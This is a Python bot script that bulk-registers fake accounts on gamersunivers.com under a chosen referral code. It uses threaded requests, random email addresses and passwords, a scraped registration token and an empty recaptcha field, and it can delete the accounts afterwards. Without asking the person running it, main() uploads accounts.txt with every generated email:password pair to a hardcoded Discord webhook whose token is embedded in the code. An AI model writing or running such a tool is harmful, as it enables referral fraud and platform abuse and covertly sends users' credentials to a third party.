import requests
from bs4 import BeautifulSoup
import random
import string
import time
import threading
import queue
import os

print(r"""
 ▄████▄   ██▓           █    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄      
▒██▀ ▀█  ▓██▒           ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄    
▒▓█    ▄ ▒██░          ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄  
▒▓▓▄ ▄██▒▒██░          ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██ 
▒ ▓███▀ ░░██████▒      ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒
░ ░▒ ▒  ░░ ▒░▓  ░      ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░
  ░  ▒   ░ ░ ▒  ░      ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░
░          ░ ░          ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒   
░ ░          ░  ░         ░         ░  ░          ░           ░  ░
░                                                                 
      By MoGlitch & Wazer (Code Luck Team ❤)



      
""")
time.sleep(1)


def generate_random_email():
    return ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"


def generate_password():
    chars = string.ascii_letters + string.digits + "!@#$%^&*()_+"
    while True:
        password = ''.join(random.choices(chars, k=12))
        if (any(c.islower() for c in password)
                and any(c.isupper() for c in password)
                and any(c.isdigit() for c in password)):
            return password


def create_account(ref_code, result_queue, index):
    try:
        session = requests.Session()
        ref_link = f"https://gamersunivers.com/?ref={ref_code}"
        session.get(ref_link, timeout=5)

        register_page = session.get(
            "https://gamersunivers.com/page/register.html", timeout=5)
        soup = BeautifulSoup(register_page.text, "html.parser")
        token = soup.find("input", {"id": "regToken"})["value"]

        email = generate_random_email()
        password = generate_password()

        payload = {
            "a": "register",
            "token": token,
            "email": email,
            "password": password,
            "password2": password,
            "tos": "true",
            "recaptcha": None
        }

        headers = {"Referer": ref_link, "X-Requested-With": "XMLHttpRequest"}

        session.post("https://gamersunivers.com/system/ajax.php",
                     data=payload,
                     headers=headers,
                     timeout=5)

        result_queue.put({
            "status": "success",
            "email": email,
            "password": password,
            "session": session,
            "index": index
        })

    except Exception as e:
        result_queue.put({"status": "error", "error": str(e), "index": index})


def delete_account(session, password, result_queue, index):
    try:
        del_payload = {"password": password, "del_acc": "Delete"}

        del_headers = {
            "Referer": "https://gamersunivers.com/page/account.html",
            "Content-Type": "application/x-www-form-urlencoded"
        }

        del_resp = session.post("https://gamersunivers.com/page/account.html",
                                data=del_payload,
                                headers=del_headers,
                                timeout=5)

        result_queue.put({
            "status":
            "success" if del_resp.status_code in [200, 302] else "error",
            "status_code":
            del_resp.status_code
            if del_resp.status_code not in [200, 302] else None,
            "index":
            index
        })

    except Exception as e:
        result_queue.put({"status": "error", "error": str(e), "index": index})


def send_to_webhook(webhook_url, file_path):
    try:
        if not os.path.exists(file_path):
            print(f"❌ Error: {file_path} does not exist.")
            return

        with open(file_path, "rb") as file:
            files = {"file": (file_path, file, "text/plain")}
            response = requests.post(webhook_url, files=files, timeout=10)

        if response.status_code == 200 or response.status_code == 204:
            print("📤 accounts.txt sent to Discord webhook successfully.")
        else:
            print(
                f"❌ Failed to send accounts.txt to webhook (Status: {response.status_code})"
            )

    except Exception as e:
        print(f"❌ Error sending file to webhook: {str(e)}")


def main():
    webhook_url = "https://discord.com/api/webhooks/1393161594707513354/JwURmSERnHSevTZk88pNQpbPQDELkv9PBYUm9F1tUtaBEfGq9KzgS2IT-kcjgqDbhUC5"
    ref_code = input("Enter your referral code (Not Link !): ").strip()
    account_count = int(input("Enter the number of accounts to create: "))
    max_threads = int(
        input("Enter the number of threads (5-20 recommended): "))
    max_threads = min(max(account_count, 1), max_threads,
                      20)  # Cap at 20 to avoid server issues

    created_accounts = []
    result_queue = queue.Queue()
    start_time = time.time()

    # Account creation
    threads = []
    for i in range(account_count):
        thread = threading.Thread(target=create_account,
                                  args=(ref_code, result_queue, i))
        threads.append(thread)
        thread.start()

        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads = []

    for t in threads:
        t.join()

    with open("accounts.txt", "a", encoding="utf-8") as file:
        results = [result_queue.get() for _ in range(account_count)]
        results.sort(key=lambda x: x["index"])  # Sort by index

        for result in results:
            idx = result["index"]
            if result["status"] == "success":
                email = result["email"]
                password = result["password"]
                print(f"[{idx+1}] ✅ Account created: {email}")
                file.write(f"{email}:{password}\n")
                created_accounts.append({
                    "session": result["session"],
                    "password": password
                })
            else:
                print(f"[{idx+1}] ❌ Error: {result['error']}")

    end_time = time.time()
    print(
        f"\n✅ Created {len(created_accounts)} accounts in {round(end_time - start_time, 2)} seconds."
    )
    print("📁 Saved to accounts.txt")

    # Send accounts.txt to webhook
    send_to_webhook(webhook_url, "accounts.txt")

    # Account deletion
    delete_option = input(
        "\n❓ Do you want to delete all created accounts? (y/n): ").strip(
        ).lower()
    if delete_option == "y":
        delete_queue = queue.Queue()
        delete_start_time = time.time()
        threads = []

        for i, acc in enumerate(created_accounts):
            thread = threading.Thread(target=delete_account,
                                      args=(acc["session"], acc["password"],
                                            delete_queue, i))
            threads.append(thread)
            thread.start()

            if len(threads) >= max_threads:
                for t in threads:
                    t.join()
                threads = []

        for t in threads:
            t.join()

        delete_results = [
            delete_queue.get() for _ in range(len(created_accounts))
        ]
        delete_results.sort(key=lambda x: x["index"])  # Sort by index

        for result in delete_results:
            idx = result["index"]
            if result["status"] == "success":
                print(f"[{idx+1}] 🗑️ Account deleted.")
            else:
                error_msg = result.get("error",
                                       f"Status: {result['status_code']}")
                print(f"[{idx+1}] ❌ Failed to delete ({error_msg})")

        delete_end_time = time.time()
        print(
            f"\n🗑️ Deleted accounts in {round(delete_end_time - delete_start_time, 2)} seconds."
        )


if __name__ == "__main__":
    main()
